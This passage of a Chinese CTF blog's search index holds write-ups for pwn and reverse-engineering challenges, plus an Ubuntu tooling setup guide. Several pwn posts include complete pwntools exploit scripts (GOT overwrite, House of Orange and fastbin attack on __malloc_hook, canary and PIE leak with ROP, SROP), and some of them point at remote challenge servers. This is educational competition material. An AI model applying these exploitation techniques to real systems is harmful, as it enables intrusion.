虽然pwn能打几乎所有队，但是我们所有题(三个web一个pwn)都在被其他所有队吊打，最终被日穿了，两个web的页面宕机，被改成了鸡你太美，属实打ctf像蔡徐坤(居然没备份源码)。准备不充分被吊打，成为了学校之耻… 回来之后有幸能和dalao们一起吃了小龙虾，还见到了夜影大师傅 …希望下次awd能有所作为吧。","categories":[],"tags":[]},{"title":"*ctf2019-quicksort","slug":"ctf2019-quicksort","date":"2019-05-04T13:18:55.000Z","updated":"2019-05-04T13:38:21.924Z","comments":true,"path":"2019/05/04/ctf2019-quicksort/","link":"","permalink":"http://yoursite.com/2019/05/04/ctf2019-quicksort/","excerpt":"leak基址+覆写GOT表","text":"leak基址+覆写GOT表 简单分析 在输入数字时，能够通过溢出覆盖ptr指针和控制i的大小。IDA分析发现，free_got在gets_got的后面，把ptr覆盖成gets_got的地址，i修改成1，这样实际上就把free_got修改成了main函数地址，并且由于并且对gets_got进行修改，排序完输出时就leak出来gets_got，得到了libc基址，再把atoi_got修改成system，之后输入/bin/sh即可获取shell。 leak出的地址是负数，自作聪明+0x100000000强行转成了正数，结果就是一直没做出来。赛后看了dalao们的wp才发现不需要这样做orz EXP1#!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * main=0x080489C9 sh = process(&apos;./quicksort/quicksort&apos;) #sh = remote(&apos;34.92.96.238&apos;,10000) elf= ELF(&apos;./quicksort/quicksort&apos;) libc= ELF(&apos;./quicksort/libc.so.6&apos;) gets_got=elf.got[&apos;gets&apos;] atoi_got=elf.got[&apos;atoi&apos;] gets=libc.symbols[&apos;gets&apos;] system=libc.symbols[&apos;system&apos;] sh.recvuntil(&apos;sort?\\n&apos;) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;number:&apos;) sh.sendline(str(main)+&apos;\\x00&apos;*7+p32(1)*3+p32(gets_got)) sh.recvuntil(&apos;result:\\n&apos;) leak=int(sh.recvline()) libcbase=leak-gets sh.recvuntil(&apos;sort?\\n&apos;) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;number:&apos;) sh.sendline(str(libcbase+system)+&apos;\\x00&apos;*6+p32(2)+p32(0)*2+p32(atoi_got)) sh.recvuntil(&apos;number:&apos;) sh.sendline(&apos;/bin/sh\\x00&apos;) sh.interactive()","categories":[],"tags":[]},{"title":"DDCTF2019-Confused","slug":"DDCTF2019-Confused","date":"2019-04-19T12:20:38.000Z","updated":"2019-04-19T12:21:05.591Z","comments":true,"path":"2019/04/19/DDCTF2019-Confused/","link":"","permalink":"http://yoursite.com/2019/04/19/DDCTF2019-Confused/","excerpt":"题目文件为一个osx的app，打开包内容可以发现Contents/MacOS里有一个xia0Crackme，很明显是要对这个文件进行分析。","text":"题目文件为一个osx的app，打开包内容可以发现Contents/MacOS里有一个xia0Crackme，很明显是要对这个文件进行分析。 IDA打开，定位到checkcode函数，对输入进行约束，前缀为DDCTF{，结尾为}，中间部分长度为18，另外进入check函数。 经过分析，程序会根据下面的数组对输入进行校验。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374[0xf0,0x10,0x66,0x0,0x0,0x0,0xf8,0xf2,0x30,0xf6,0xc1,0xf0,0x10,0x63,0x0,0x0,0x0,0xf8,0xf2,0x31,0xf6,0xb6,0xf0,0x10,0x6a,0x0,0x0,0x0,0xf8,0xf2,0x32,0xf6,0xab,0xf0,0x10,0x6a,0x0,0x0,0x0,0xf8,0xf2,0x33,0xf6,0xa0,0xf0,0x10,0x6d,0x0,0x0,0x0,0xf8,0xf2,0x34,0xf6,0x95,0xf0,0x10,0x57,0x0,0x0,0x0,0xf8,0xf2,0x35,0xf6,0x8a,0xf0,0x10,0x6d,0x0,0x0,0x0,0xf8,0xf2,0x36,0xf6,0x7f,0xf0,0x10,0x73,0x0,0x0,0x0,0xf8,0xf2,0x37,0xf6,0x74,0xf0,0x10,0x45,0x0,0x0,0x0,0xf8,0xf2,0x38,0xf6,0x69,0xf0,0x10,0x6d,0x0,0x0,0x0,0xf8,0xf2,0x39,0xf6,0x5e,0xf0,0x10,0x72,0x0,0x0,0x0,0xf8,0xf2,0x3a,0xf6,0x53,0xf0,0x10,0x52,0x0,0x0,0x0,0xf8,0xf2,0x3b,0xf6,0x48,0xf0,0x10,0x66,0x0,0x0,0x0,0xf8,0xf2,0x3c,0xf6,0x3d,0xf0,0x10,0x63,0x0,0x0,0x0,0xf8,0xf2,0x3d,0xf6,0x32,0xf0,0x10,0x44,0x0,0x0,0x0,0xf8,0xf2,0x3e,0xf6,0x27,0xf0,0x10,0x6a,0x0,0x0,0x0,0xf8,0xf2,0x3f,0xf6,0x1c,0xf0,0x10,0x79,0x0,0x0,0x0,0xf8,0xf2,0x40,0xf6,0x11,0xf0,0x10,0x65,0x0,0x0,0x0,0xf8,0xf2,0x41,0xf6,0x6,0xf7,0x1,0x0,0x0,0x0,0xf3,] 0xf0使a=0xf0后面的第二个数 0xf8使a凯撒移位2位 0xf2比较输入与a是否相等 0xf6如果相等则向下运行，否则改变程序流程 0xf7使标记success和failed的标志位为success 0xf3结束程序 加密解密不是很复杂，贴上脚本： 12345678910s=[0x66,0x63,0x6a,0x6a,0x6d,0x57,0x6d,0x73,0x45,0x6d,0x72,0x52,0x66,0x63,0x44,0x6a,0x79,0x65]flag=&apos;&apos;for i in s: if i&gt;=ord(&apos;a&apos;) and i&lt;=ord(&apos;z&apos;): flag+=chr((i-ord(&apos;a&apos;)+2)%26+ord(&apos;a&apos;)) elif i&gt;=ord(&apos;A&apos;) and i&lt;=ord(&apos;Z&apos;): flag+=chr((i-ord(&apos;A&apos;)+2)%26+ord(&apos;A&apos;)) else: flag+=chr(i)print flag","categories":[],"tags":[]},{"title":"CGCTF-homura_note","slug":"CGCTF-homura-note","date":"2019-04-17T11:03:01.000Z","updated":"2019-04-17T11:27:26.149Z","comments":true,"path":"2019/04/17/CGCTF-homura-note/","link":"","permalink":"http://yoursite.com/2019/04/17/CGCTF-homura-note/","excerpt":"House of Orange &amp; Fastbin Attack","text":"House of Orange &amp; Fastbin Attack 简单分析程序初始化了2个大小为0x88的note，内容是两个字符串。 程序有三个函数，add，show和pandorabox。 其中，add函数功能是分配一个note，大小限制为0-4096字节，但是读入内容时没有限制大小，存在堆溢出。 show函数功能是输出一个note的内容。 pandorabox函数只能使用一次，功能为输出初始的两个note的内容，然后free这两个note进unsortedbin，fd和bk指针指向main_arena+88，但是并没有把指向这两个note的指针置零，所以执行完这个函数之后使用show函数输出note0的内容，就可以得到main_arena+88的地址，也就得到了libc的所有地址。 House of OrangeHouse of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。 通过控制top chunk的size，可以使得free出的是fastbin，并且控制fastbin的size是0x71，这样在之后能够在malloc_hook之前构造大小为0x7f的chunk，使用Fastbin Attack写内容到malloc_hook。 1add(0xe40,&apos;d&apos;*0xe40+p64(0)+p64(0x91)) add(0x90,&apos;c&apos;) 经过精心的构造，这样就分配出size为0x71的fastbin。 Fastbin Attack在进行Fastbin Attack，还需要先泄漏libc地址： 1sh.recvuntil(&quot;&gt;&gt;&quot;) sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;(yes:1)&apos;) sh.sendline(&apos;1&apos;) show(0) sh.recvuntil(&apos;:&apos;) leak=u64(sh.recv(6)+&quot;\\x00\\x00&quot;) fakechunk=leak-88-16-0x20-3 onegadget_addr=leak-88-0x3bfb00+0xf241b 此时Fastbin里只有一块，并且fd指针指向0x0，设法修改fd指针，即可实现Fastbin Attack。 因为之前使用pandorabox时，free掉了初始化的两个note，并且合并成了一块大小为0x121。 这时申请一块大小为0x110的note，就会分配到之前初始化的note的地址，因为这个地址是在置入fastbin的note之前的，所以利用堆溢出可以修改fd指针。 1add(0x110,&apos;a&apos;*0xf60+p64(0)+p64(0x71)+p64(fakechunk)) add(0x60,&apos;a&apos;) add(0x60,&apos;a&apos;*19+p64(onegadget_addr)) sh.interactive() 之后再申请一块任意大小的note，就会调用malloc_hook里的onegadget，获取shell。 利用脚本1from pwn import * #sh=process(&apos;./note&apos;) sh=remote(&apos;45.76.173.177&apos;,5678) libc=ELF(&apos;./libc6_2.24-12ubuntu1_amd64.so&apos;) onegadget=[0x45556,0x455aa,0xf15a1,0xf241b] def add(size,content): sh.recvuntil(&apos;&gt;&gt;&apos;) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;:&apos;) sh.sendline(str(int(size))) sh.recvuntil(&apos;:&apos;) sh.sendline(content) def show(index): sh.recvuntil(&apos;&gt;&gt;&apos;) sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;:&apos;) sh.sendline(str(index)) add(0xe40,&apos;d&apos;*0xe40+p64(0)+p64(0x91)) add(0x90,&apos;c&apos;) sh.recvuntil(&quot;&gt;&gt;&quot;) sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;(yes:1)&apos;) sh.sendline(&apos;1&apos;) show(0) sh.recvuntil(&apos;:&apos;) leak=u64(sh.recv(6)+&quot;\\x00\\x00&quot;) fakechunk=leak-88-16-0x20-3 onegadget_addr=leak-88-0x3bfb00+0xf241b add(0x110,&apos;a&apos;*0xf60+p64(0)+p64(0x71)+p64(fakechunk)) add(0x60,&apos;a&apos;) add(0x60,&apos;a&apos;*19+p64(onegadget_addr)) sh.interactive()","categories":[],"tags":[]},{"title":"从零开始的Ubuntu16.04配置","slug":"从零开始的Ubuntu16-04配置","date":"2019-04-15T11:47:01.000Z","updated":"2019-04-16T06:22:02.634Z","comments":true,"path":"2019/04/15/从零开始的Ubuntu16-04配置/","link":"","permalink":"http://yoursite.com/2019/04/15/从零开始的Ubuntu16-04配置/","excerpt":"记录一下，方便以后虚拟机爆炸时重新配置。","text":"记录一下，方便以后虚拟机爆炸时重新配置。 换源跳到更新源文件所在的目录下，终端执行： cd /etc/apt/ 此时，我们可以在当前目录看一下里面的文件，终端执行: ls 我们会看到当前目录下所有文件，不出意外 会有一个sources.list文件，这个文件里面写的就是更新源。我们接下来都是对它进行操作 将原来的更新源备份一下，注意要用管理员权限进行操作，终端执行： sudo cp sources.list copy_sources.list 此时，当前目录下会多一个copy_sources.list的文件，是我们自己的备份，万一我们把更新源改坏了，还可以恢复回来 更换更新源，终端执行： sudo gedit sources.list 然后复制想换的源进去保存就可以了 阿里源： 123456789101112131415161718# deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricteddeb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-propertiesdeb http://archive.canonical.com/ubuntu xenial partnerdeb-src http://archive.canonical.com/ubuntu xenial partnerdeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse 更新源，终端执行： sudo apt update 安装pip终端执行： sudo apt install python-pip pip换源新建一个~/.pip/pip.conf 内容为： 1234[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple[install]trusted-host=mirrors.aliyun.com 更新pip终端执行： sudo pip install --upgrade pip 终端执行： sudo gedit /usr/bin/pip 将 from pip import main 改为 from pip._internal import main 保存即可 安装git终端执行： sudo apt install git 安装ruby终端执行： sudo apt install ruby 安装pwntools终端执行： sudo pip install pwntools 安装pwndbg终端执行： 123git clone https://github.com/pwndbg/pwndbgcd pwndbgsudo ./setup.sh 安装one_gadget终端执行： sudo gem install one_gadget 安装z3终端执行： pip install z3-solver 安装open-cv终端执行： pip install opencv-python 安装angr终端执行： 12345pip install virtualenvwrapperexport WORKON_HOME=$HOME/Python-workhomesource /usr/local/bin/virtualenvwrapper.shmkvirtualenv angrpip install angr 为方便以后使用，写一个vr.sh： 12export WORKON_HOME=$HOME/Python-workhomesource /usr/local/bin/virtualenvwrapper.sh 使用时，终端执行： 12. vr.shworkon angr 进入安装好angr的虚拟环境","categories":[],"tags":[]},{"title":"PinTool安装与简单使用","slug":"PinTool安装与简单使用","date":"2019-04-14T16:26:11.000Z","updated":"2019-04-15T11:44:54.903Z","comments":true,"path":"2019/04/15/PinTool安装与简单使用/","link":"","permalink":"http://yoursite.com/2019/04/15/PinTool安装与简单使用/","excerpt":"整了好久…话说去年看东南平台上的那道mov时就想试试pin了，结果一直不知道咋整，上周六东南校赛又出了一道几乎一样的题，迫使我从零开始重新弄了一遍，最后结合很多dalao的教程终于能跑起来了。","text":"整了好久…话说去年看东南平台上的那道mov时就想试试pin了，结果一直不知道咋整，上周六东南校赛又出了一道几乎一样的题，迫使我从零开始重新弄了一遍，最后结合很多dalao的教程终于能跑起来了。 下载微软官方网址 选择对应的系统下载并解压即可 我这里使用的是linux版本，osx版本在之后使用时需要关闭sip保护，也不是很困难但是既然linux可以直接用就不搞那么麻烦了 编译12cd pin/source/tools/ManualExamples/make TARGET=ia32/intel64 #可以指定目标版本 编译好之后当前目录就会出现obj-ia32/obj-intel64文件夹，之后根据文件是32位/64位使用对应的文件夹里的.so文件。 使用这里贴上东南平台上的mov的解题脚本 只要编译好之前的ManualExamples就能运行，算是pin最简单的使用了 1#!/usr/bin/env python #-*- coding:utf-8 -*- import popen2,string INFILE = &quot;test&quot; CMD = &quot;~/pin/pin -t ~/pin/source/tools/ManualExamples/obj-ia32/inscount1.so -- ~/mov.dms &lt; &quot; + INFILE choices = &quot;(_ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;abcdefghijklmnopqrstuvwxyz0123456789!#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\\]^`|~&quot;#自定义爆破字典顺序，将数字和小写字母提前可以使得速度快一些~ def execlCommand(command): global f fin,fout = popen2.popen2(command) result1 = fin.readline()#获取程序自带打印信息，wrong或者correct print result1 result2 = fin.readline()#等待子进程结束,结果输出完成 fin.close() def writefile(data): fi = open(INFILE,&apos;w&apos;) fi.write(data) fi.close() flag = &apos;&apos; while 1: l = 0#初始化计数器 for i in choices: key = flag + i print &quot;&gt;&quot;,key writefile(key) execlCommand(CMD) fi = open(&apos;./inscount.out&apos;, &apos;r&apos;) while(1): try: n = int(fi.read().split(&apos; &apos;)[1], 10) break except IndexError: continue fi.close() print n if(l-n &gt; 1 and l):#如果两次运行指令差别过大，说明字符正确 flag += i print flag break else: l = n if &apos;&#125;&apos; in flag: break print flag 脚本有点小问题，字典第一个字符最好放一个不可能出现在flag里的字符。 跑的电脑好烫","categories":[],"tags":[]},{"title":"bugku-pwn3","slug":"bugku-pwn3","date":"2019-04-08T12:25:46.000Z","updated":"2019-04-08T12:46:20.796Z","comments":true,"path":"2019/04/08/bugku-pwn3/","link":"","permalink":"http://yoursite.com/2019/04/08/bugku-pwn3/","excerpt":"题目保护全开，leak canary+libc。","text":"题目保护全开，leak canary+libc。 好久没发blog了 思路程序有两次输入机会，第一次可以任意输入，同时输入完还会打印出输入的内容。第二次最多只能输入624个字符，而输入624个字符正好可以把返回地址覆盖完毕。通过把返回地址覆盖成main地址，实现多次运行main函数，完成所需的leak以及最终获取shell。 第一次运行main第一次输入，覆盖掉canary的\\x00位，在之后程序就会打印出canary，第二次输入的时候就可以绕过canary保护。PIE保护会导致程序的地址随机化，但是后三位是不会变的，例如第二次输入完后程序的返回地址main+e的后三位就是0xd2e，利用输入把2e覆盖成20，程序就会再次运行main函数。 第二次运行main第一次输入时，覆盖到返回地址前，这样程序会打印出main+e的地址，结合ida分析的结果可以得到程序的基址。第二次输入同第一次main函数。 第三次运行main第一次输入时，布置好栈，使程序运行puts，打印出puts的got表地址，同时打印完返回到main函数。第二次输入同第一次输入，但是只需要624个字符。 第四次运行main第一次输入时，布置好栈，使程序运行puts，打印出read的got表地址，同时打印完返回到main函数。第二次输入同第一次输入，但是只需要624个字符。 获取了read和puts的地址后就可以知道libc的版本以及基址。 第五次运行main第一次输入忽略，第二次输入把返回地址修改成onegadget地址。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *puts_plt=0x8b0puts_got=0x202018read_got=0x202048pop_rdi=0xe03sh=remote(&apos;114.116.54.89&apos;,10000)sh.recvuntil(&quot;path:\\n&quot;)sh.sendline(&quot;flag&quot;)sh.recvuntil(&quot;len:\\n&quot;)sh.sendline(&quot;624&quot;)sh.recvuntil(&quot;note:\\n&quot;)sh.sendline(&apos;a&apos;*600)sh.recvuntil(&apos;aaaaaaaaa\\n&apos;)canary=u64(&quot;\\x00&quot;+sh.recv(7))sh.recvuntil(&quot;)\\n&quot;)sh.send(&apos;a&apos;*600+p64(canary)+p64(1)+&apos;\\x20&apos;)sh.recvuntil(&quot;path:\\n&quot;)sh.sendline(&quot;flag&quot;)sh.recvuntil(&quot;len:\\n&quot;)sh.sendline(&quot;624&quot;)sh.recvuntil(&quot;note:\\n&quot;)sh.sendline(&apos;a&apos;*615)sh.recvuntil(&apos;aaaaaaaaa\\n&apos;)main=u64(sh.recv(6)+&quot;\\x00\\x00&quot;)-0xebase=main-0xd20sh.recvuntil(&quot;)\\n&quot;)sh.send(&apos;a&apos;*600+p64(canary)+p64(1)+&apos;\\x20&apos;)sh.recvuntil(&quot;path:\\n&quot;)sh.sendline(&quot;flag&quot;)sh.recvuntil(&quot;len:\\n&quot;)sh.sendline(&quot;1000&quot;)sh.recvuntil(&quot;note:\\n&quot;)sh.sendline(&apos;a&apos;*600+p64(canary)+p64(1)+p64(pop_rdi+base)+p64(puts_got+base)+p64(puts_plt+base)+p64(main))sh.recvuntil(&quot;)\\n&quot;)sh.send(&apos;a&apos;*600+p64(canary)+p64(1)+p64(pop_rdi+base))puts=u64(sh.recv(6)+&quot;\\x00\\x00&quot;)print hex(puts)sh.recvuntil(&quot;path:\\n&quot;)sh.sendline(&quot;flag&quot;)sh.recvuntil(&quot;len:\\n&quot;)sh.sendline(&quot;1000&quot;)sh.recvuntil(&quot;note:\\n&quot;)sh.sendline(&apos;a&apos;*600+p64(canary)+p64(1)+p64(pop_rdi+base)+p64(read_got+base)+p64(puts_plt+base)+p64(main))sh.recvuntil(&quot;)\\n&quot;)sh.send(&apos;a&apos;*600+p64(canary)+p64(1)+p64(pop_rdi+base))read=u64(sh.recv(6)+&quot;\\x00\\x00&quot;)print hex(read)libc=read-0x0f7250sh.recvuntil(&quot;path:\\n&quot;)sh.sendline(&quot;flag&quot;)sh.recvuntil(&quot;len:\\n&quot;)sh.sendline(&quot;1000&quot;)sh.recvuntil(&quot;note:\\n&quot;)sh.sendline(&apos;a&apos;*600)sh.recvuntil(&quot;)\\n&quot;)sh.send(&apos;a&apos;*600+p64(canary)+p64(1)+p64(0xf1147+libc))sh.interactive()","categories":[],"tags":[]},{"title":"0ctf2017-babyheap","slug":"0ctf2017-babyheap","date":"2019-03-27T14:43:07.000Z","updated":"2019-03-27T17:16:12.777Z","comments":true,"path":"2019/03/27/0ctf2017-babyheap/","link":"","permalink":"http://yoursite.com/2019/03/27/0ctf2017-babyheap/","excerpt":"fastbin attack，比cgctf的note稍微难一点。","text":"fastbin attack，比cgctf的note稍微难一点。 保护全开，思路和cgctf的note是一样的，当时做的时候因为找不到wp，就是对着这道题的wp做的。 当只有一个 small/large chunk 被释放时，small/large chunk的 fd 和 bk 指向 main_arena 中的地址。如果泄漏出这里fd或bk指向的地址，那么就可以得到libc基址。最后利用malloc_hook，可以执行onegadget，获取shell。 这道题比cgctf的note难的是，这道题不存在UAF，所以泄漏main_arena的地址变得稍微难了一点，但是利用fastbinattack还是可以做到的。 12allocate(0x10) #用来 allocate(0x10) #实现 allocate(0x10) #fastbin attack allocate(0x10) #用来修改下一个chunk的size allocate(0x80) #用来泄漏main_arena allocate(0x80) #使上一个chunk free后能指向main_arena free(1) free(2) fill(0,0x41,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+&quot;\\x80&quot;) fill(3,0x20,p64(0)*3+p64(0x21)) allocate(0x10) allocate(0x10) fill(3,0x20,p64(0)*3+p64(0x91)) free(4) dump(2) leak=sh.recv(8) libc_base=u64(leak)-0x3c4b20-88malloc_hook=libc_base+0x3c4b20-10 这里通过修改第5个chunk的size，2次malloc第五个chunk，index2和index4指向的都是第五个chunk，free4之后dump2就能打印出main_arena+88地址，从而泄漏libc基址。 关于main_arena在libc中的偏移，可以使用ida打开libc文件，在malloc_trim函数中找到。 在调用malloc函数时，程序会对malloc_hook进行检查，如果不为0，就会调用malloc_hook指向的函数，借此调用onegadget。fastbin是一个单链表，其fd指针会指向下一个可分配的chunk。修改掉最后并进fastbin中的chunk的fd指针，使其指向malloc_hook，这样之后第二次malloc出的chunk就会出现在malloc_hook。但是在malloc之前，程序会对要分配的地址进行检查，如果没有对应size的chunk，就不会在此处分配，所以要进行偏移构造。 可以看到偏移-20-0x3的时候malloc_hook上方就构造出了一个size为0x7f的chunk。 找到的onegadget，尝试发现0x4526a的可以用。 经过尝试，填充大小为19时可以覆盖到malloc_hook exp： 1# -*- coding:utf-8 -*- # from pwn import * def allocate(Size): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;Size: &quot;) sh.sendline(str(int(Size))) def fill(Index,Size,Content): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;2&quot;) sh.recvuntil(&quot;Index: &quot;) sh.sendline(str(Index)) sh.recvuntil(&quot;Size: &quot;) sh.sendline(str(int(Size))) sh.recvuntil(&quot;Content: &quot;) sh.send(Content) def free(Index): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;3&quot;) sh.recvuntil(&quot;Index: &quot;) sh.sendline(str(Index)) def dump(Index): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;4&quot;) sh.recvuntil(&quot;Index: &quot;) sh.sendline(str(Index)) elf = ELF(&apos;./libc.so.6&apos;) sh = process(&apos;./heap-2&apos;) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x80) allocate(0x80) free(1) free(2) fill(0,0x41,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+&quot;\\x80&quot;) fill(3,0x20,p64(0)*3+p64(0x21)) allocate(0x10) allocate(0x10) fill(3,0x20,p64(0)*3+p64(0x91)) free(4) dump(2) leak=sh.recvuntil(&quot;\\x00\\x00&quot;)[-8:] libc_base=u64(leak)-0x3c4b78 malloc_hook=libc_base+0x3c4b20-0x10 print hex(malloc_hook) allocate(0x60) free(4) fill(2,8,p64(malloc_hook-0x20-0x3)) allocate(0x60) allocate(0x60) fill(6,0x1b,p64(0)*2+&quot;\\x00\\x00\\x00&quot;+p64(libc_base+0x4526a)) allocate(0x1) sh.interactive()","categories":[],"tags":[]},{"title":"栈-SROP","slug":"栈-SROP","date":"2019-03-26T04:30:46.000Z","updated":"2019-03-26T14:01:32.944Z","comments":true,"path":"2019/03/26/栈-SROP/","link":"","permalink":"http://yoursite.com/2019/03/26/栈-SROP/","excerpt":"CTFWIKI-SROP","text":"CTFWIKI-SROP 例题是ichunqiu的一道pwn-smallest。 IDA打开，只有几行汇编，题如其名。 123456789public startstart proc nearxor rax, raxmov edx, 400hmov rsi, rspmov rdi, raxsyscallretnstart endp 调用syscall之前，rax=0，rdi=0，rsi=rsp，edx=0x400 可知执行的是0号syscall，即read(0,$rsp,400)，产生了栈溢出 同时read函数读取的字节数会返回到rax中，如果跳过执行xor rax, rax就可以利用这一点设置rax的值执行想要的syscall。 最后retn会使得rip=[rsp] rsp=rsp+8。 exp： 1# -*- coding:utf-8 -*- # from pwn import * elf = ELF(&apos;./stack-5.&apos;) sh = process(&apos;./stack-5.&apos;) context.arch = &apos;amd64&apos; syscall_addr = 0x4000be start_addr = 0x4000b0 payload = &quot;&quot; payload += p64(start_addr)*3 sh.send(payload) #返回到start，因为之后要通过read返回值修改rax，所以先把之后的返回地址也布置好 sleep(3) sh.send(&apos;\\xb3&apos;) #修改返回地址为0x4000b3，跳过xor，rax的值为1 #执行write(1，rsp，0x400) stack_addr = u64(sh.recv()[8:16]) print &apos;stack addr :&apos;+str(hex(stack_addr)) #接收rsp地址 sigframe = SigreturnFrame() sigframe.rax = constants.SYS_read sigframe.rdi = 0 sigframe.rsi = stack_addr sigframe.rdx = 0x400 sigframe.rsp = stack_addr sigframe.rip = syscall_addr payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe) #read(0,stack_addr_,0x400) sh.send(payload) #修改signal Frame，返回到start sigreturn = p64(syscall_addr) + &apos;\\x00&apos; * 7 #rax=15，执行sigreturn sh.send(sigreturn) #返回到syscall sigframe = SigreturnFrame() sigframe.rax = constants.SYS_execve sigframe.rdi = stack_addr + 0x120 #/bin/sh存放地址 sigframe.rsi = 0x0 sigframe.rdx = 0x0 sigframe.rsp = stack_addr sigframe.rip = syscall_addr frame_payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe) #execve(&apos;/bin/sh&apos;,0,0) payload = frame_payload + (0x120 - len(frame_payload)) * &apos;\\x00&apos; + &apos;/bin/sh\\x00&apos; #把/bin/sh读到rsp+0x120 sh.send(payload) #修改signal Frame，返回到start sh.send(sigreturn) #执行sigreturn sh.interactive()","categories":[],"tags":[]},{"title":"KCTF2019Q1","slug":"KCTF2019Q1","date":"2019-03-25T23:47:49.000Z","updated":"2019-07-02T11:48:37.685Z","comments":true,"path":"2019/03/26/KCTF2019Q1/","link":"","permalink":"http://yoursite.com/2019/03/26/KCTF2019Q1/","excerpt":"好菜，这次必看着dalao的wp学习一波。","text":"好菜，这次必看着dalao的wp学习一波。 流浪者1234567891011121314s=&quot;KanXueCTF2019JustForhappy&quot;dic=&quot;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&quot;index=[]key=&quot;&quot;for i in s: index.append(dic.find(i))for i in index: if i&gt;=0 and i&lt;=9: key+=chr(i+48) if i&gt;=10 and i&lt;=35: key+=chr(i+87) if i&gt;=36: key+=chr(i+29)print key 初入好望角魔改了一波源代码就可以解密了，毕竟key和iv都给了，不过之前没怎么用代码实现过AES加密，所以选择了魔改源代码，看了dalao们的wp，使用py应该可以代码更简洁一些。 12345678910111213141516171819202122232425using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Security.Cryptography;namespace HelloWorldApplication&#123; class HelloWorld &#123; static void Main(string[] args) &#123; byte[] keyArray = new PasswordDeriveBytes(&quot;Kanxue2019&quot;, null).GetBytes(32); byte[] ivArray = Encoding.UTF8.GetBytes(&quot;Kanxue2019CTF-Q1&quot;); byte[] toEncryptArray = Convert.FromBase64String(&quot;4RTlF9Ca2+oqExJwx68FiA==&quot;); RijndaelManaged rDel = new RijndaelManaged(); rDel.Key = keyArray; rDel.IV = ivArray; rDel.Mode = CipherMode.CBC; rDel.Padding = PaddingMode.Zeros; ICryptoTransform cTransform = rDel.CreateDecryptor(); byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length); Console.WriteLine(UTF8Encoding.UTF8.GetString(resultArray)); &#125; &#125;&#125; REPWN这题当时做的时候完全没意识到栈溢出，所以只做出来前面一半，明明名字给了提示了2333 这里会对输入进行检验，要求从第9位开始是X1Y0uN3tG00d，第21位是H。 这个函数就是栈溢出所在，strcpy时可以覆盖到返回地址，改变程序进程。sub_4013b0限制了输入的前8位，简单的方程组求解，答案是20101001。 由于之前已经限制了第21位输入是H，所以可以知道跳转到的地址的最后两位是f0。由于程序的地址只有六位，所以开头两位必定是00，可以推出第二十四位输入是k。 在IDA里发现0x401bf0处的代码是红色的，没有被识别为函数，这里手动创建一下函数，发现这个函数应该就是需要跳转到的地址，输入应为HaCk。 输入20101001X1Y0uN3tG00dHaCk后程序情况 分析sub_401bf0，发现对输入进行des加密，key为XiyouNet，得到第二部分输入Wel1C0me。 当时没看出栈溢出，但是发现了函数sub_401bf0，只知道最终答案格式是第一次输入加第二次输入，可惜没能分析出des，也不知道怎么样能进行第二次输入，属实鶸。 影分身之术这一题当时甚至还找了出题人去年出的题的wp，结果也是只做出了一半233 首先有一段js混淆，解密后代码： 123456789101112131415function ckpswd() &#123; key = &quot;simpower91&quot;; a = document.all.pswd.value; if (a.indexOf(key) == 0) &#123; l = a.length; i = key.length; sptWBCallback(a.substring(i, l)); &#125; else &#123; alert(&quot;wrong!&lt;&quot; + a + &quot;&gt; is not my GUID ;-)&quot;); return &quot;1234&quot;; &#125;&#125;function ok() &#123; alert(&quot;congratulations!&quot;);&#125; 输入的key的前缀必须是simpower91，之后的字符会作为sptWBCallback的参数，猜测是调用ok函数，不过上网找了半天也不知道怎么样的字符能调用到ok函数… 1234567function sptWBCallback(spt_wb_id,spt_wb_name,optionstr)&#123; url=&apos;#sptWBCallback:id=&apos;; url=url+spt_wb_id+&apos;;eventName=&apos;+spt_wb_name; if(optionstr) url=url+&apos;;params=optionstr&apos;; location=url;&#125; 